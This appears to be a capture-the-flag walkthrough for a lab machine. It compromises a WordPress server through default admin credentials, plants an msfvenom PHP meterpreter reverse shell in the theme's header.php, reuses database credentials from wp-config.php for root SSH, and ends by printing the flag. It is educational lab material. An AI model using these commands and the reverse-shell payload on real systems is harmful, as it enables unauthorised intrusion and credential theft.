## Let's Start

We start with checking our IP address with:
    ifconfig

![ifconfig](https://i.imgur.com/EeQBHLq.png)
Our IP is:

> 192.168.1.45

Now open ***Zenmap*** (nmap GUI verison),
and do a "Quick Scan" for the IP "192.168.1.*"  ( * symbolize for every number)
![Zenmap Scan](https://i.imgur.com/NGs3HmO.png)
We found that the Target IP is: 

> 192.168.1.47

and that there are a lot of open ports, include the http port (80),
so let's try to put this IP in the FireFox
![IP in FireFox](https://i.imgur.com/T2XfGj2.png)
When we click on the image we move to this page
![Anther Page](https://i.imgur.com/mrQpu7G.png)
But there is nothing in those pages or in the pages source

Let's try to check what we have on the web server with ***Nikto***

    nikto -h 192.168.1.47

![Nikto Scan](https://i.imgur.com/nOeWzvJ.png)
We got that there is a 

 - **rotbots.txt** - we need to manually open
 - **Wordpress** - on the server

Let's use ***Curl*** to get information from server (we want to get the robots.txt file)

    curl -h 192.168.1.47/robots.txt

![Robots.txt Check](https://i.imgur.com/mbrdgZG.png)
We got that there is Wordpress on the server, and that hackers are not allowed (sad smiley).

 - [x] ***robtos.txt***

now let's check the Wordpress
![Wordpress](https://i.imgur.com/Ohtfoo9.png)

 - [x] Wordpress

 We have excellent tool for Wordpress called ***wpscan***, so let's use it.

    wpscan --url 192.168.1.47/wordpress --enumerate

![Wpscan](https://i.imgur.com/oKiB3FH.png)
![Default Admin Password](https://i.imgur.com/XkOuZka.png)
|username|Password  |
|--|--|
|  admin|admin  |
|wpuser| wpuser

We can see that we got the WP verison and that the **default admin password** is still in use!!

Now to move to the login page, just click on the login button the left down corner of the page
![Move To Login Page](https://i.imgur.com/TZ3KWHR.png)

> 192.168.1.47/wordpress/wp-login.php

now use the *username:password*

> admin:admin

and....We're in!
Whenever you login to Wordpress admin page, it's recommnded to try to upload *php shell script*.
So let's create one with ***msfvenom*** (it's tool of Metasploit that generate payloads)

    msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.45 LPORT=4444 -f raw > Desktop/phpshell.php

Let's break it down - 

 

 - **msfvenom** - the software we use
 - **-p php/meterpreter/reverse_tcp** - the payload we want to use
 - **LHOST 192.168.1.45** - our host to send the information to.
 - **LPORT 4444** - the port we want to work on
 - **-f raw** - the file format we want
 - **> Desktop/phpshell.php** - where we want to save the file and the name of it

![Msfvenom Php Shell](https://i.imgur.com/ksXkYrF.png)
Now open the file with some editor and copy the php code
![PHP Code](https://i.imgur.com/CcMhelV.png)
Now we need to go back to the wordpress admin panel and find some place to upload this php code, let's check if in the *Appearance* there is some place for this, maybe in the *editor*.
Yes we can find on the right side of the screen the php code for the header lets click on it, and paste our code and at the end upload it to the server.

 1. Appearance
 2. Editor
 3. header.php
 4. paste code
 5. upload
 
![Upload the php code](https://i.imgur.com/eeo3Cug.png)

Now we want to start listening to this port, so we open ***msfconsole***.

    msfconsole
and update our settings

    use exploit/multi/handler
    set payload php/meterpreter/reverse_tcp
    set lhost 192.168.1.45
    set lport 4444
    exploit
and now we are start listening.
Open the web page of wordpress

> 192.168.1.47/wordpress

![Open the web page](https://i.imgur.com/2c5hnqM.png)
And back to the console we can see that we have connection
![New Connection](https://i.imgur.com/fWCNC35.png)
We want to search in files for clues, so let's see what files we have with the basic command

    ls

We can see a config file, open it

    cat wp-config.php

we can see we have a username and password to MySQL, maybe its the same for the ssh?

|username|password  |
|--|--|
|root  |rootpassword!  |

to connect for the ssh we use this:

    ssh root@192.168.1.47

it's ask for password, so write *rootpassword!* (you cant see your typing when you type the password but keep typing and press enter)
And we are in!

Again let's check the files for clues with

    ls

we can see a file name *flag.txt*.
Open it

    cat flag.txt

## The flag is:

***8e3f9ec016e3598c5eec11fd3d73f6fb***
